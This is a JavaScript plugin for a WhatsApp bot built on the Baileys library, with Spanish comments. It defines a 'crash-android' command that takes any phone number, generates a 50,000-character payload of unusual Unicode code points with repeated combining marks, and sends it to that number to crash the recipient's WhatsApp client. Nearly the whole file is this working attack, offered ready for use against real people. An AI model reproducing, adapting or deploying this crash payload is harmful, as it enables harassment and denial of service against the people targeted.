import { jidDecode } from '@whiskeysockets/baileys'

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ola', 'ca', 'crash'],
    category: 'travas',
    noPrefix: true,

    run: async (conn, m, { args, command }) => {
        // Validación de número
        if (!args[0]) {
            return conn.sendMessage(m.chat, { 
                text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n> ✐ *Escribe el número.*\n✰ \`Uso\`: ${command} [número]` 
            }, { quoted: m })
        }

        try {
            // Limpieza de JID
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // Generación de Entropía Máxima (50k Unicodes Únicos)
            const generarCarga = (cant) => {
                let str = ""
                const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
                for (let i = 0; i < cant; i++) {
                    let bloque = bloques[i % bloques.length]
                    str += String.fromCodePoint(bloque + (i % 800))
                    if (i % 8 === 0) str += String.fromCodePoint(0x0345) 
                }
                return str
            }

            const cargaFinal = generarCarga(50000)

            // Reacción de inicio
            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })

            // Envío del ataque
            await conn.sendMessage(targetJid, { text: cargaFinal })

            // Confirmación opcional
            await conn.sendMessage(m.chat, { 
                text: `✅ *Carga enviada a @${targetNum}*`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error('Error en Crash System:', err)
        }
    }
}

export default crashAndroidMisa
